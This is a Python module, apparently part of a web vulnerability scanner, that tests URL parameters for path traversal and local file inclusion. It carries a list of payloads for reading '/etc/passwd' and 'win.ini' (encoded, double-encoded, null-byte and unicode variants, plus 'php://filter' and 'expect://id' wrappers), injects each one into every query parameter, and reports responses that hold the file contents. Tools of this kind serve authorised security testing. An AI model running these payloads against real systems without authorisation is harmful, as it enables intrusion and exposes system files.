"""GECKO APOCALYPSE - Advanced Path Traversal / LFI Tester"""
import asyncio, aiohttp
from typing import List, Dict
from urllib.parse import urlparse, parse_qs, urlencode

class PathTraversal:
    def __init__(self, session, config, db):
        self.session = session; self.config = config; self.db = db

    async def scan(self, url, content, headers, response):
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        payloads = [
            # Basic
            "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
            # URL Encoded
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
            # Double URL Encoded
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            # Null Byte
            "../../../etc/passwd%00",
            # 16-bit Unicode
            "..%u2215..%u2215..%u2215etc%u2215passwd",
            # Wrappers
            "php://filter/read=convert.base64-encode/resource=/etc/passwd",
            "expect://id"
        ]
        
        for param in params:
            for p in payloads:
                test = self._inject(url, param, p)
                try:
                    async with self.session.get(test, timeout=aiohttp.ClientTimeout(total=10)) as r:
                        c = await r.text(errors='ignore')
                        if 'root:x:0:0' in c or '[extensions]' in c or 'cm9vd' in c:
                            findings.append({'type':'Advanced Path Traversal / LFI','severity':'CRITICAL','url':url,
                                    'parameter':param,'payload':p,'evidence':'Sensitive file content found in response',
                                    'cwe':'CWE-22','owasp':'A01:2021'})
                            break
                except: pass
        return findings

    def _inject(self, url, param, value):
        parsed = urlparse(url); params = parse_qs(parsed.query)
        params[param] = [value]
        return parsed._replace(query=urlencode(params, doseq=True)).geturl()
